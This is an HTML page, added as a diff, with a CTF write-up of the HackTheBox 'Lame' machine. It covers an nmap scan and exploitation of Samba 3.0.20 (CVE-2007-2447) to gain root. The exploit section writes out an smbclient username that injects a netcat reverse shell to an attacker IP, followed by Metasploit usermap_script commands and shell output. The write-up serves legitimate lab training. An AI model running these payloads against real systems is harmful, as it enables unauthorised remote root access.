@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HackTheBox: Lame Machine Walkthrough // 0xRohinth CTF Writeup</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="css/main.css">
+</head>
+<body class="hacker-bg-grid min-h-screen flex flex-col text-slate-200">
+
+    <!-- Lightbox Modal -->
+    <div id="image-lightbox" onclick="closeLightbox()">
+        <button id="lightbox-close">&times;</button>
+        <img id="lightbox-img" src="" alt="Zoomed screenshot" onclick="event.stopPropagation()">
+    </div>
+
+    <!-- Main Container -->
+    <div class="container mx-auto px-4 sm:px-6 lg:px-8 max-w-4xl flex-grow">
+
+        <!-- Navigation Header -->
+        <header class="flex justify-between items-center py-6 border-b border-slate-800">
+            <a href="index.html" class="flex items-center gap-2 text-xl font-bold font-mono text-white tracking-wider hover:text-cyan-400 transition-colors">
+                <span class="text-cyan-400">&gt;</span> 0xRohinth<span class="animate-pulse text-emerald-400">_</span>
+            </a>
+            <a href="index.html" class="text-sm font-mono text-cyan-400 hover:text-emerald-400 transition-colors flex items-center gap-1">
+                &larr; ./back_to_index
+            </a>
+        </header>
+
+        <main class="py-8">
+            <article class="mx-auto">
+                <!-- Article Header -->
+                <header class="mb-8 pb-6 border-b border-slate-800">
+                    <div class="flex items-center gap-3 mb-4">
+                        <span class="category-tag">Pwn</span>
+                        <span class="text-xs font-mono text-slate-500">//</span>
+                        <span class="text-xs font-mono text-slate-400">2 min read</span>
+                    </div>
+
+                    <h1 class="text-3xl md:text-5xl font-extrabold text-white tracking-tight mb-4 leading-tight">
+                        HackTheBox: Lame Machine Walkthrough
+                    </h1>
+
+                    <div class="flex flex-wrap items-center justify-between gap-4 text-xs font-mono text-slate-400 pt-2">
+                        <div class="flex items-center gap-2">
+                            <span>PUBLISHED:</span>
+                            <span class="text-cyan-400">2026-03-15</span>
+                        </div>
+                        <div class="flex flex-wrap gap-2">
+                            <span class="category-tag">#HackTheBox</span> <span class="category-tag">#Nmap</span> <span class="category-tag">#Samba</span> <span class="category-tag">#Linux</span>
+                        </div>
+                    </div>
+                </header>
+
+                <!-- CTF Machine Specs Box (if present) -->
+                
+    <div class="ctf-specs-grid">
+      <div class="ctf-spec-item"><span class="ctf-spec-label">PLATFORM</span><span class="ctf-spec-value">HackTheBox</span></div>
+      <div class="ctf-spec-item"><span class="ctf-spec-label">OPERATING SYSTEM</span><span class="ctf-spec-value">Linux</span></div>
+      <div class="ctf-spec-item"><span class="ctf-spec-label">TARGET IP</span><span class="ctf-spec-value text-cyan-400">10.10.10.3</span></div>
+      <div class="ctf-spec-item"><span class="ctf-spec-label">POINTS</span><span class="ctf-spec-value text-emerald-400">20</span></div>
+      <div class="ctf-spec-item"><span class="ctf-spec-label">DIFFICULTY</span><span class="ctf-spec-value"><span class="cyber-badge badge-diff-easy">easy</span></span></div>
+    </div>
+
+                <!-- Optional Hero Image -->
+                
+  <div class="mb-8 rounded-lg overflow-hidden border border-slate-700 shadow-xl">
+    <img src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=1000&auto=format&fit=crop" alt="HackTheBox: Lame Machine Walkthrough" onclick="openLightbox(this.src)" class="w-full h-64 md:h-80 object-cover cursor-pointer hover:scale-105 transition-transform duration-300" />
+  </div>
+
+                <!-- Article Content -->
+                <div class="post-content">
+                    <h1>Executive Summary</h1>
+<p><strong>Lame</strong> is a beginner-friendly Linux machine on HackTheBox. It is a classic target requiring basic network enumeration and exploiting a known vulnerability in <strong>Samba 3.0.20 (<code>username map script</code>)</strong>.</p>
+<hr>
+<h2>1. Reconnaissance &amp; Enumeration</h2>
+<p>We start by running an initial <strong>Nmap</strong> scan against target IP <code>10.10.10.3</code> to discover open ports and running services.</p>
+
+  <div class="code-wrapper">
+    <div class="code-wrapper-header">
+      <span class="font-mono text-xs text-cyan-400">BASH</span>
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    </div>
+    <pre><code class="language-bash">nmap -sC -sV -oA nmap/lame 10.10.10.3</code></pre>
+  </div><h3>Nmap Scan Results</h3>
+
+  <div class="code-wrapper">
+    <div class="code-wrapper-header">
+      <span class="font-mono text-xs text-cyan-400">TEXT</span>
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    </div>
+    <pre><code class="language-text">PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
+3632/tcp open  distcc      distccd v1</code></pre>
+  </div><blockquote>
+<p>[!NOTE]<br>Key Findings:</p>
+<ul>
+<li>FTP (<code>vsftpd 2.3.4</code>)</li>
+<li>Samba (<code>smbd 3.0.20-Debian</code>) on TCP 139/445</li>
+<li>Distcc daemon on TCP 3632</li>
+</ul>
+</blockquote>
+<hr>
+<h2>2. Exploitation (Samba CVE-2007-2447)</h2>
+<p>Samba version <code>3.0.20</code> is vulnerable to Remote Code Execution via shell command injection in the <code>username map script</code> configuration (<code>CVE-2007-2447</code>).</p>
+<h3>Payload Crafting</h3>
+<p>When connecting via <code>smbclient</code>, specifying a username with backticks causes command execution on the target:</p>
+
+  <div class="code-wrapper">
+    <div class="code-wrapper-header">
+      <span class="font-mono text-xs text-cyan-400">BASH</span>
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    </div>
+    <pre><code class="language-bash">smbclient //10.10.10.3/tmp -U &#039;/=`nohup nc -e /bin/bash 10.10.14.2 4444`&#039;</code></pre>
+  </div><p>Alternatively, using <strong>Metasploit</strong>:</p>
+
+  <div class="code-wrapper">
+    <div class="code-wrapper-header">
+      <span class="font-mono text-xs text-cyan-400">BASH</span>
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    </div>
+    <pre><code class="language-bash">msfconsole
+use exploit/multi/samba/usermap_script
+set RHOSTS 10.10.10.3
+set LHOST 10.10.14.2
+run</code></pre>
+  </div>
+  <div class="code-wrapper">
+    <div class="code-wrapper-header">
+      <span class="font-mono text-xs text-cyan-400">TEXT</span>
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    </div>
+    <pre><code class="language-text">[*] Started reverse TCP handler on 10.10.14.2:4444 
+[*] Command shell session 1 opened (10.10.14.2:4444 -&gt; 10.10.10.3:49158)
+
+whoami
+root</code></pre>
+  </div><hr>
+<h2>3. Capturing Flags</h2>
+<p>Since Samba executes commands directly as <code>root</code>, no privilege escalation is needed!</p>
+
+  <div class="code-wrapper">
+    <div class="code-wrapper-header">
+      <span class="font-mono text-xs text-cyan-400">BASH</span>
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    </div>
+    <pre><code class="language-bash">id
+# uid=0(root) gid=0(root)
+
+cat /home/makis/user.txt
+# [USER FLAG CAPTURED]
+
+cat /root/root.txt
+# [ROOT FLAG CAPTURED]</code></pre>
+  </div><blockquote>
+<p>[!TIP]<br>Always verify service versions during enumeration. Legacy services like <code>Samba 3.0.20</code> often contain pre-auth RCE vulnerabilities!</p>
+</blockquote>
+
+                </div>
+
+                <!-- Article Footer / Navigation -->
+                <footer class="mt-12 pt-8 border-t border-slate-800 flex flex-col md:flex-row justify-between items-center gap-4 text-sm font-mono">
+                    <a href="index.html" class="text-cyan-400 hover:text-emerald-400 transition-colors">
+                        &larr; Back to all writeups
+                    </a>
+                    <button onclick="window.scrollTo({top: 0, behavior: 'smooth'})" class="filter-btn">
+                        Back to Top &uarr;
+                    </button>
+                </footer>
+            </article>
+        </main>
+
+        <!-- Site Footer -->
+        <footer class="mt-12 py-6 border-t border-slate-800 text-center font-mono text-xs text-slate-500">
+            <p>&copy; 2026 0xRohinth. CTF Writeup & Security Research Notes.</p>
+        </footer>
+    </div>
+
+    <!-- Scripts for Code Copy & Lightbox -->
+    <script>
+        // Lightbox Functions
+        function openLightbox(src) {
+            const lightbox = document.getElementById('image-lightbox');
+            const img = document.getElementById('lightbox-img');
+            img.src = src;
+            lightbox.classList.add('active');
+        }
+
+        function closeLightbox() {
+            document.getElementById('image-lightbox').classList.remove('active');
+        }
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closeLightbox();
+        });
+
+        // Copy Code Button Handler
+        function copyCode(button) {
+            const wrapper = button.closest('.code-wrapper');
+            const codeBlock = wrapper.querySelector('code');
+            const textToCopy = codeBlock.innerText;
+
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                const originalText = button.innerText;
+                button.innerText = 'COPIED!';
+                button.style.backgroundColor = '#00ff9d';
+                button.style.color = '#000';
+
+                setTimeout(() => {
+                    button.innerText = originalText;
+                    button.style.backgroundColor = '';
+                    button.style.color = '';
+                }, 2000);
+            }).catch(err => {
+                console.error('Failed to copy code:', err);
+            });
+        }
+    </script>
+</body>
+</html>
